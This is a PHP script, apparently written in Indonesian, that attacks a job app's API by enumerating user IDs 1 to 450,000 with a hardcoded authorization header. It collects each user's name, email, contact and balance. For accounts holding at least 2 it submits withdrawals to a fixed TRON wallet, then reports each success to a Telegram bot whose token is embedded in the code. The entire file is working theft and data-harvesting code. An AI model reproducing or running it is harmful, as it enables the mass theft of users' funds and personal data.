<?php
error_reporting(0);
define('TOKEN_BOT', '6487821820:AAElTFyyBSxBj2gVr795VgXB3BNAzEgDvxE');
function sendTelegramMessage($chatId, $message) {
    $url = "https://api.telegram.org/bot" . TOKEN_BOT . "/sendMessage";
    $postData = http_build_query(array(
        'chat_id' => $chatId,
        'text' => $message
    ));

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    return $result;
}
$id = 1;
for($i=1;$i<=450000;$i++){

$url = "https://smartjob.amandroidapps.com/api/user/profile/info";
$data = array(
    "user_id" => $id
);

$headers = array(
    "Host: smartjob.amandroidapps.com",
    "Authorization: INGHHJEGHJEUDFGHYSBW7583546837NUDD75465546",
    "Content-Type: application/x-www-form-urlencoded",
    "User-Agent: okhttp/5.0.0-alpha.2"
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
}

curl_close($ch);
$js = json_decode($response);
//var_dump($js);
if ($js->message == "Data Found") {
    $name = $js->data->name;
    $email = $js->data->email;
    $contact = $js->data->contact;
    $balance = $js->data->balance;
    $refferal_balance = $js->data->refferal_balance;
    echo "Balance: $balance\n";
    $ss = explode(".",$balance);
    if($ss[0] >= 2){
    	$url = "https://smartjob.amandroidapps.com/api/submit/withdraw";
$data = array(
    "user_id" => $id,
    "trx" => "2",
    "payment_title" => "TRON TRX (TRC20)",
    "user_wallet_address" => "TZ9WZn1yiP4LSoGaQg5K1PYmUYz2vRXJfs"
);

$headers = array(
    "Authorization: INGHHJEGHJEUDFGHYSBW7583546837NUDD75465546",
    "Content-Type: application/x-www-form-urlencoded",
    "Host: smartjob.amandroidapps.com",
    "Connection: Keep-Alive",
    "User-Agent: okhttp/5.0.0-alpha.2"
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
}

curl_close($ch);

if ($response) {
    $responseData = json_decode($response, true);
    if (isset($responseData["success"]) && $responseData["success"] === true) {
    	$chatId = "1397941074";
$message = "===================\nSUKSES WD\nID: $id\n===================\n";
$response = sendTelegramMessage($chatId, $message);
if ($response === false) {
    echo "Pesan tidak terkirim.\n";
} else {
    echo "Pesan berhasil terkirim.\n";
}
        echo "Sukses: " . $responseData["message"];
    } else {
        echo "Permintaan Gagal: " . $responseData["message"];
    }
} else {
    echo "Tidak ada respons dari server.";
}
    }
}else{
	
}
$id++;


}


